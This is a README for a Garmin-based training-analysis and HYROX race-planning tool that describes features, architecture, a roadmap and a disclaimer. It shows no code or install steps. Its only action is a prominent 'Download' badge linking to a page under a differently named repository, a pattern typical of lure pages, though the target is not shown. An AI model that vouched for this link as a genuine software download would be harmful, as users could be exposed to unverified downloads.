![preview](https://raw.githubusercontent.com/akashhyadav/Hyrox-Race-Forge/main/view_74e9.svg)
[![Download](https://raw.githubusercontent.com/akashhyadav/Hyrox-Race-Forge/main/grab_c8a3b.svg)](https://akashhyadav.github.io/Hyrox-Race-Forge/)

# 🏃 GarminHyroxPlanner — Training Intelligence & Race-Day Strategy Engine

> **NOTE:** This repository is the evolution of the original Garmin training analysis and race planning project. It has been completely reimagined into a modular, extensible, and community-driven platform for endurance athletes who want to understand *why* their body performs the way it does — and how to steer that performance toward a specific race goal.

If you have ever stared at a pile of Garmin activity files and wondered, *“What is all of this actually telling me?”* — this project exists for you. GarminHyroxPlanner is not simply another dashboard. It is a **training intelligence layer** that sits between your wearable and your race calendar, transforming noisy time-series data into a coherent narrative about your fitness, fatigue, and readiness.

The name reflects its origins: it was born from a desire to plan for HYROX-style hybrid racing, where running endurance meets functional strength. But the architecture quickly outgrew that single use case, and today it supports marathoners, triathletes, tactical athletes, and anyone who treats training as a design problem rather than a guessing game.

---

## 📖 Table of Contents

- [Why This Project Exists](#-why-this-project-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Analysis Modules](#-analysis-modules)
- [Race Planning Engine](#-race-planning-engine)
- [Data Sources & Compatibility](#-data-sources--compatibility)
- [Multilingual Support](#-multilingual-support)
- [Responsive User Interface](#-responsive-user-interface)
- [Support Model](#-support-model)
- [SEO & Discoverability](#-seo--discoverability)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Contribution](#-community--contribution)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why This Project Exists

Most training platforms answer the question *“How far did I go?”* — few answer *“What did that distance actually do to me?”*

GarminHyroxPlanner was created after years of manually stitching together spreadsheets, heart-rate drift calculations, and hand-drawn pacing charts. The goal was simple: build a tool that respects the complexity of human physiology while remaining approachable enough for a weekend athlete to use on a Tuesday evening before a long run.

The repository is structured as an open, inspectable system. Every calculation is documented. Every threshold is configurable. Nothing is hidden behind a proprietary black box. If you disagree with how a training load value is computed, you can change it — and the rest of the pipeline will adapt.

---

## 🧠 Core Philosophy

1. **Evidence over intuition.** Where possible, analysis is grounded in established sports science literature (Banister impulse-response models, TRIMP, HRV-guided training, critical power concepts).
2. **Explainability first.** Every metric presented to the athlete is accompanied by a short, human-readable explanation of how it was derived.
3. **Local-first, cloud-optional.** Your activity data belongs to you. The default configuration processes everything on your own machine.
4. **Design for the taper.** Race planning is not just about building fitness — it is about arriving at the start line fresh, confident, and tactically prepared.
5. **Modular by nature.** Each analysis module can be swapped, extended, or disabled without breaking the whole.

---

## ✨ Feature Highlights

- 📊 **Deep Activity Analysis** — Parse and enrich Garmin FIT/TCX/GPX exports with derived metrics such as aerobic decoupling, cardiac drift, and grade-adjusted pace.
- 🧮 **Training Load Modeling** — Compute acute and chronic workload ratios, monotony, strain, and readiness scores using configurable windows.
- 🏁 **Race-Day Strategy Builder** — Generate pacing plans for running, hybrid, and multi-stage events with negative-split and conservative-start presets.
- 🔄 **Scenario Simulation** — Explore “what-if” outcomes by adjusting fatigue, sleep debt, or terrain assumptions and observe projected finish-time shifts.
- 🗣️ **Multilingual Interface** — Full support for English, German, Spanish, French, Japanese, and Simplified Chinese, with community-maintained locale packs.
- 📱 **Responsive Experience** — The interface adapts cleanly from a phone on the track to a widescreen monitor at a coaching desk.
- 🧩 **Plugin Ecosystem** — Register custom analyzers, report templates, and export formats through a documented extension interface.
- 🔐 **Privacy-Respecting Defaults** — No telemetry is transmitted unless explicitly enabled; all secrets are stored in environment-scoped configuration.
- 🛎️ **Round-the-Clock Assistance** — Community channels and documentation are maintained so that questions rarely wait until morning.
- 🧪 **Reproducible Reports** — Every generated report includes a manifest of parameters, versions, and input hashes so results can be regenerated or audited.

---

## 🏗️ Architecture Overview

The system is organized into five cooperating layers. Each layer communicates through stable interfaces, which means you can replace any single layer without rewriting its neighbors.

**Layer 1 — Ingestion.** Accepts activity exports, wellness logs, and manual entries. Normalizes timestamps, units, and sensor channels into a canonical internal format.

**Layer 2 — Enrichment.** Applies physiological transforms: smoothing, drift correction, zone classification, and elevation normalization.

**Layer 3 — Modeling.** Builds training-load curves, readiness indices, and fatigue-propagation estimates.

**Layer 4 — Planning.** Maps current fitness and fatigue onto a target event, producing a pacing and fueling strategy.

**Layer 5 — Presentation.** Renders charts, tables, and narrative summaries through the responsive interface or as static exports.

A detailed diagram and interface contracts live in the `docs/architecture` directory of the repository.

---

## 🔬 Analysis Modules

### Cardiac Drift & Aerobic Decoupling
Measures how much your heart rate rises relative to pace during sustained efforts, offering a window into aerobic efficiency and heat stress.

### Grade-Adjusted Pace
Recomputes pace as if the route were flat, allowing fair comparison between hilly and flat sessions.

### Training Stress Balance
Tracks the tension between fitness gains and accumulated fatigue, helping you avoid the trap of endlessly adding load.

### Readiness Composite
Combines resting heart rate variability, sleep duration, and recent load into a single readiness signal — presented with a confidence band, never as a false-precision number.

### Strength-Endurance Ratio
For hybrid athletes, tracks the balance between running volume and functional strength work, highlighting imbalances that tend to surface late in a race.

---

## 🏁 Race Planning Engine

The planning engine treats a race as a **resource allocation problem**. You have a finite tank of glycogen, a finite tolerance for neuromuscular fatigue, and a fixed distance. The engine helps you distribute those resources across segments.

Key capabilities include:

- **Segment Decomposition** — Split a course into meaningful chunks (climbs, descents, station blocks) and assign target intensities.
- **Negative-Split Presets** — Templates for athletes who perform best when starting conservatively.
- **Station Strategy** — For hybrid events, model time spent at each functional station and its downstream effect on running pace.
- **Weather-Aware Adjustments** — Incorporate forecast temperature and humidity to shift pacing targets accordingly.
- **Taper Timeline** — Generate a day-by-day reduction schedule leading into race week.

Reports are generated in both machine-readable and human-friendly formats, so coaches and athletes can each consume what they need.

---

## 🔌 Data Sources & Compatibility

GarminHyroxPlanner is designed to be a gracious guest in your existing ecosystem. It reads common activity and wellness export formats and does not require any particular device vendor. Compatibility notes, supported file schemas, and field-mapping tables are maintained in the repository documentation.

Where a data source provides richer information than the canonical model supports, the extra fields are preserved in a passthrough store so nothing is silently discarded.

---

## 🌍 Multilingual Support

Language should never be a barrier to understanding your own training. The interface ships with several complete locale packs and a translation workflow that welcomes community contributions. Right-to-left layouts are supported through a mirrored style layer, and number/date formatting follows each locale’s conventions.

Adding a new language involves editing a single structured file — no code changes required.

---

## 📱 Responsive User Interface

The interface is built around the idea that you might check it **on a phone at the trailhead** or **on a large display while reviewing a training block**. Layouts reflow gracefully, charts remain legible at small sizes, and critical numbers are always visible without scrolling. Touch targets meet accessibility guidelines, and color choices maintain contrast in both light and dark modes.

Accessibility is treated as a feature, not an afterthought: keyboard navigation, screen-reader labels, and reduced-motion preferences are all respected.

---

## 🛎️ Support Model

Assistance is available around the clock through a combination of documentation, community discussion channels, and maintainer office hours. Questions are triaged by topic so that newcomers get onboarding help quickly while advanced users can dive into modeling internals. Response expectations and escalation paths are documented in the support guide.

We believe that a tool for athletes should be as dependable as the athletes themselves — so the support model aims for consistency rather than sporadic bursts of attention.

---

## 🔍 SEO & Discoverability

This project is written to be found by the people who need it. Documentation naturally incorporates relevant terminology such as *Garmin training analysis*, *race planning software*, *HYROX pacing strategy*, *training load modeling*, *heart rate variability readiness*, and *endurance performance analytics*. These phrases appear where they genuinely help a reader, never as mechanical repetition.

If you arrived here searching for a way to make sense of your wearable data, you are in the right place.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Introduce a unified wellness timeline that overlays sleep, HRV, and load on a single axis.
- **Q2 2026** — Expand the planning engine with multi-race season scheduling.
- **Q3 2026** — Release a plugin marketplace for community-built analyzers.
- **Q4 2026** — Publish a formal validation report comparing modeled readiness against observed race outcomes.

The roadmap is a living document; priorities shift as the community voices its needs.

---

## 🤝 Community & Contribution

Contributions of all sizes are welcome — from typo fixes to entirely new analysis modules. Before opening a large change, please start a discussion so we can align on direction. Code style, commit conventions, and review expectations are described in the contributing guide.

We are especially interested in contributions that improve **explainability**, **accessibility**, and **multilingual coverage**.

---

## ⚠️ Disclaimer

GarminHyroxPlanner is an analytical and planning aid intended for informational and educational purposes only. It is **not** a medical device and does not provide medical advice, diagnosis, or treatment. Training load, readiness, and race-planning outputs are estimates derived from models and should never replace professional judgment from a qualified physician, physiotherapist, or certified coach.

Always listen to your body. If you experience pain, dizziness, or unusual fatigue, stop and seek appropriate professional guidance. The maintainers and contributors of this project accept no liability for injury, illness, or performance outcomes resulting from the use of this software. You are solely responsible for the decisions you make regarding your training and racing.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the terms of that license. The full text is available here: [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 — GarminHyroxPlanner contributors.

---

[![Download](https://raw.githubusercontent.com/akashhyadav/Hyrox-Race-Forge/main/grab_c8a3b.svg)](https://akashhyadav.github.io/Hyrox-Race-Forge/)